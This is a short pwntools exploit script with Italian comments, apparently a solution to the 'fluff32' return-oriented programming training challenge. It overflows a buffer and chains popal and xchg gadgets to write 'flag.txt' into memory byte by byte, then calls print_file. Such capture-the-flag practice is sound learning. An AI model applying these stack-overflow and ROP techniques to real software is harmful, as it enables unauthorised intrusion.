from pwn import *

elf = ELF("./fluff32")
p = process("./fluff32")

"""
    Nell'esercizio fluff viene richiesto di scrivere in memoria 'flag.txt' come per write4, ma senza la presenza del gadget mov ptr [reg1], reg2.
    Andremo ad utilizzare il gadget 'xchg byte ptr [ecx], dl' che per il nostro scopo funziona in maniera analoga e utilizzeremo il gadget popal che corrisponde 
    al pop di tutti i registri nel seguente ordine: edi esi ebp esp ebx edx ecx eax.
"""

popal = p32(0x08048527)
xchg_ecx_dl = p32(0x08048555)
writable_area = 0x0804a018
print_file = p32(0x80483d0)


def rop_manager(s, addr):
	rop = b''
	rop += popal
	rop += p32(0)    #edi
	rop += p32(0)    #esi
	rop += p32(0)    #ebp
	rop += p32(0)    #esp
	rop += p32(0)    #ebx
	rop += s         #edx
	rop += p32(addr) #ecx
	rop += p32(0)    #eax
	rop += xchg_ecx_dl
	return rop
 

# Avendo solo dl, andremo ad inserire un carattere alla volta. gli altri 3 byte possono essere qualsiasi cosa.
payload = b''
payload += rop_manager(b'fxxx', writable_area)
payload += rop_manager(b'lxxx', writable_area + 1)
payload += rop_manager(b'axxx', writable_area + 2)
payload += rop_manager(b'gxxx', writable_area + 3)
payload += rop_manager(b'.xxx', writable_area + 4)
payload += rop_manager(b'txxx', writable_area + 5)
payload += rop_manager(b'xxxx', writable_area + 6)
payload += rop_manager(b'txxx', writable_area + 7)


payload += print_file + p32(0) + p32(writable_area)


p.recvuntil('> ')
p.send(cyclic(44) + payload)					   
p.interactive()
